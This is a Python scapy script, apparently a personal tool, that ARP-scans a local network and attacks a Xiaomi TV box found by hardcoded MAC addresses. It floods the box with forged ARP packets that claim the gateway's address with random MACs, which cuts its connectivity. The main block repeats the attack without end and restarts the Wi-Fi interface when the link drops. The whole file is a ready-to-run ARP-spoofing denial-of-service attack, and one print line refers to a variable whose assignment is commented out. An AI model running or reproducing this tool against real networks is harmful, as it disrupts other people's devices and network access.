#!/usr/bin/env python
# _*_ coding=utf-8 _*_

from scapy.all import *
import time
import random
import os
#-------------------------------------------------------
def GetSubNet(OurIP):
    '''
    获取子网，192.168.0
    '''
    Index = 0
    SubString = ""
    while True:
        num = OurIP.find('.',Index)
        if num != -1:
            Index = num + 1
        if num == -1:
            SubString = OurIP[:Index]
            break
    return SubString
#-------------------------------------------------------
def GetMac(tgtIP):
    '''
    获取目标IP的MAC地址。
    tgtIP:目标IP地址
    '''
    retry = 2
    try:
        while retry > 0:
            tgtMac = getmacbyip(tgtIP)
            if tgtMac == None:
                print("Get Mac of ",tgtIP,"failed...Will Retry")
                retry = retry - 1
            else:return tgtMac
    except:
        print("Get Mac of ",tgtIP,"failed...")
#-------------------------------------------------------
def GetBrocastIP(OurIP):
    '''
    获取局域网广播地址
    OurIP :我们的IP地址
    '''
    return GetSubNet(OurIP) + "255"
#-------------------------------------------------------
def GetForgetIP(OurIP,Num):
    '''
    伪造IP地址
    OurIP:我们自己的IP
    Num:要伪造多少个IP地址
    '''
    SubString = GetSubNet(OurIP)
    #伪造IP
    ForgetIP = []
    i = 0
    while i < Num:
        num = int(random.uniform(0,255))
        TempIP = SubString + "%d"%num
        if TempIP == OurIP:
            continue
        else:
            ForgetIP.append(TempIP)
            i = i + 1
    return ForgetIP
#-------------------------------------------------------
def GetForgeMac(OurMac,Num):
    '''
    生成随机MAC地址
    OurMac:我们自己的MAC地址，不能跟自己重复啊
    '''
    ForgeMac = []
    j = 0
    while j < Num:
        while True:
            i = 0
            TempMac = ""
            while i < 6:
                num = int(random.uniform(0,255))
                TempMac = TempMac + "%02X"%num
                if i <= 4:TempMac = TempMac + ":"
                i = i + 1
            if TempMac == OurMac:
                pass
            else:
                ForgeMac.append(TempMac)
                j = j + 1
                break
    return ForgeMac
Table = {}
def Scanf(OurIP,Start,End,TimeOut):
    '''
    扫描网络，获取IP-MAC并保存
    OurIP：我们的IP地址
    Start：扫描起始地址 
    End：扫描结束地址
    TimeOut：超时时间
    例如：OurIP = 192.168.0.105，Start = 99，End = 150
    扫描IP范围：192.168.0.99 ~ 192.168.0.150
    '''
    Table.clear()
    SubString = GetSubNet(OurIP)
    ip = []
    for num in range(Start,End):
        ip.append(SubString+str(num))
    ans,unans=srp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op=1,pdst=ip),timeout=TimeOut)
    def GetArpResult(r):
        Table[r.sprintf("%ARP.hwsrc%")] = r.sprintf("%ARP.psrc%")
        return r.sprintf("%ARP.hwsrc%\t%ARP.psrc%")
    g = lambda(s,r):GetArpResult(r)
    ans.summary(g)
#-------------------------------------------------------
def GetIpByMac(Mac):
    if len(Table) == 0:return None
    return Table.get(Mac)
#-------------------------------------------------------
def Attack_xiaomi(Face,PackNum,Counter,Interval):
    '''
    攻击小米盒子
    Face:网卡接口
    PackNum:数据包数目
    Counter:攻击次数(-1：无限次)
    Interval:攻击间隔
    例如：Face="wlan0",PackNum=10,Counter=-1,Interval=1
    '''
    MY_ip = get_if_addr(Face)
    MY_mac = get_if_hwaddr(Face)
    print(MY_ip,"@",MY_mac)
    if MY_ip == None or MY_mac == None:return
    
    BctIP = GetBrocastIP(MY_ip)
    Bct_mac = "FF:FF:FF:FF:FF:FF"
    print(BctIP,"@",Bct_mac)
    
    GW_ip = "192.168.0.1"
    GW_mac = GetMac(GW_ip)
    print(GW_ip,"@",GW_mac)
    if GW_mac == None:return
    
    #XM_mac = "20:47:47:ba:99:1e"
    #XM_mac = "3c:97:0e:56:69:52"
    #XM_mac = "c8:3a:35:c0:05:15"
    #XM_mac = "24:09:95:95:e2:02"
    #XM_mac = "e8:b4:c8:7b:f3:0f"
    XM_mac = "04:e6:76:46:a6:f3"
    ScanfCnt = 0
    while True:
        Scanf(MY_ip,100,150,5)
        XM_ip = GetIpByMac(XM_mac)
        if XM_ip == None:ScanfCnt = ScanfCnt + 1
        else:break
        time.sleep(ScanfCnt*5)
        if ScanfCnt > 3:return
    print(XM_ip,"@",XM_mac)
    
    while True:
        #Attack packs
        Temp_mac = GetForgeMac(MY_mac,PackNum)
        Temp_ip = GetForgetIP(MY_ip,PackNum)
        #,src="20:47:47:ba:99:1e"
        #PKT_1 = Ether(dst=GW_mac)/ARP(op=1,psrc=XM_ip,hwsrc=Temp_mac,pdst=GW_ip,hwdst=GW_mac)
        PKT_2 = Ether(dst=XM_mac)/ARP(op=1,psrc=GW_ip,hwsrc=Temp_mac,\
        pdst=XM_ip,hwdst=XM_mac)
        try:
            #time.sleep(0.5)
            sendp(PKT_2,iface = Face)
        except:
            print("!!Send Error!!")
        #sleep
        #num = float(random.uniform(0,Interval))
        print("Will sleep for ",num,"S")
        time.sleep(Interval)
        if Counter == -1:
            pass
        else:
            Counter = Counter - 1
            if Counter == 0:
                return
        print("Counter:",Counter)
#-------------------------------------------------------
#检查WIFI是否连接，否则重连
#-------------------------------------------------------
def EnsureWifiConnection():
    if GetMac("192.168.0.1") == None:
        print('\n****** wifi is down, restart... ******\n')
        os.system("sudo ifconfig wlan0 down")
        time.sleep(4)
        os.system("sudo ifconfig wlan0 up")
        time.sleep(4)
        os.system('sudo /etc/init.d/networking restart')
        time.sleep(4)
        return True
    else:return False
if __name__ == "__main__":
    #while True:
    #AttackIP("192.168.0.108","wlan0",10,60,"192.168.0.1")
    #AttackMac(Mac,face,Num,Interval,GW_IP):
    #AttackMac("C8:3A:35:C0:05:15","wlan0",2,2,"192.168.0.108")
    num=0
    while num < 0:
        num = num + 1
        time.sleep(60)
        print(num)
    while True:
        while EnsureWifiConnection() == True:
            pass
        Attack_xiaomi("wlan0",10,5000,0.0)










